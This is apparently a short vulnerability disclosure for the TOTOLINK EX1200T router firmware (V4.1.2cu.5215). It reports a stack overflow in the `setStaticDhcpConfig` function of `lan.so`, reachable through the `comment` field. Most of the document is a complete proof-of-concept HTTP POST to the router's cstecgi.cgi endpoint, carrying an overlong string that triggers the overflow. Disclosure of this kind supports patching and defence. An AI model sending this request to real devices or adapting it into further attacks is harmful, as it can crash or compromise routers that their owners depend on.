# TOTOLINK EX1200T STACK OVERFLOW

## Stack Overflow Vulnerability Description

PRODUCT: TOTOLINK EX1200T V4.1.2cu.5215 (latest version)

There is a stack overflow in the function `setStaticDhcpConfig` of the file `lan.so`, we can control the`comment` to attack.

![image-20211102181615964](https://cdn.jsdelivr.net/gh/p1Kk/blogImg/Pictureimage-20211102181615964.png)

## PoC

```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Host: 192.168.0.254
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
If-Modified-Since: Thu, 01 Jan 1970 00:00:03 GMT
Connection: close
Content-Length: 247

{"topicurl":"setting/setStaticDhcpConfig",
"addEffect":"","enable": "0",
"macAddress":"00:0c:21:ae:e4:44",
"ipAddress":"1.1.1.1",
"comment":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}
```

